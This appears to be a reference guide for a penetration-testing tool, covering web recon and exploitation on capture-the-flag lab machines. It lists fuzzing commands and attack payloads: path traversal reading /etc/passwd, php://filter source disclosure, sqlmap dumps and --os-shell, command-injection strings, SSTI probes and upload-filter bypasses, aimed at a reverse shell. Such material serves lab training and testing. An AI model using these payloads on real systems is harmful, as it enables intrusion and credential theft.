# Web enumeration and exploitation

Web is the foothold on the majority of lab machines. Do the manual read *and*
the fuzzing — the intended path is often a comment, a stale link, or a login
form's error-message difference, none of which a fuzzer surfaces.

## Manual read first (2 minutes, high yield)

```bash
pwnloop x "curl -sik http://machine.htb/ | head -60"
pwnloop x "whatweb -a3 http://machine.htb"
pwnloop x "curl -s http://machine.htb/robots.txt; curl -s http://machine.htb/sitemap.xml"
```

Look for: framework and version in headers/meta, developer comments, email
addresses (username seeds), JS files referencing API paths, upload forms, any
parameter that looks like a filename or a URL.

## Directory and file fuzzing

```bash
W=/usr/share/seclists/Discovery/Web-Content
pwnloop x "feroxbuster -u http://machine.htb -w $W/raft-medium-directories.txt \
       -x php,txt,html,bak,zip -t 50 -o /engagements/$NAME/scans/ferox-80.txt"
```

If the app is clearly PHP/ASPX/etc., set `-x` to that extension plus `bak`,
`old`, `txt`, `zip`. Filter noise by size or status once you see the pattern
(`-S <size>` / `-C 404,403`).

## Vhost fuzzing

```bash
pwnloop x "ffuf -u http://$T/ -H 'Host: FUZZ.machine.htb' \
       -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
       -fs <size-of-default-response> -o /engagements/$NAME/scans/vhost.json"
```

The `-fs` filter is mandatory — without it every response matches. Take the
size from an obviously-wrong host header first.

## Parameter fuzzing

```bash
pwnloop x "ffuf -u 'http://machine.htb/page.php?FUZZ=test' \
       -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>"
```

## Vulnerability classes, in the order they usually appear on labs

**Local file inclusion** — any parameter taking a path or template name.
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php     # source disclosure
?page=/var/log/apache2/access.log                                # log poisoning → RCE
```
Source disclosure via the `php://filter` wrapper is the highest-value LFI
outcome: read `config.php`, `db.php`, `.env` and you usually have credentials.

**File upload** — check what the filter actually validates: extension, MIME,
magic bytes. Bypasses: `.phtml`, `.php5`, `.phar`, double extension,
`.htaccess` upload, null byte on old stacks, valid image header + PHP tail.
Then find where the file landed (fuzz `/uploads/`, `/images/`, the response).

**SQL injection** — test `'`, `"`, `\`, then order-by/union. Once confirmed, go
straight to `sqlmap` for extraction rather than hand-rolling:
```bash
pwnloop x "sqlmap -u 'http://machine.htb/x.php?id=1' --batch --dbs"
pwnloop x "sqlmap -u '...' --batch -D db -T users --dump"
pwnloop x "sqlmap -u '...' --batch --os-shell"     # when FILE privilege exists
```

**SSTI** — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`. A rendered `49` means
RCE is usually one payload away (Jinja2, Twig, Freemarker, Velocity).

**Command injection** — parameters feeding ping/nslookup/convert/zip. Test
`;id`, `|id`, `$(id)`, `` `id` ``, `%0aid`. Blind: time-based (`;sleep 5`) or
out-of-band to your `tun0` listener.

**Deserialization** — PHP `unserialize` on a cookie, Java `rO0` base64, .NET
`ViewState`, Python pickle. Identify the magic bytes, then build a gadget.

**Auth bypass** — SQLi in login, default credentials, JWT `alg: none` or weak
HMAC secret (crack with `john`), IDOR on user IDs, password reset token
predictability, registration of an admin-named account.

**Known-CMS** — WordPress → `wpscan --url ... -e ap,at,u`. Anything else, get
the exact version and `searchsploit` it. Lab CMS installs are usually a single
CVE away from RCE.

## After exploitation

Whatever the vector, aim for a reverse shell (see `references/foothold.md`) or
a credential. A web shell is fine as a stepping stone but upgrade quickly —
interactive access is where enumeration gets fast.
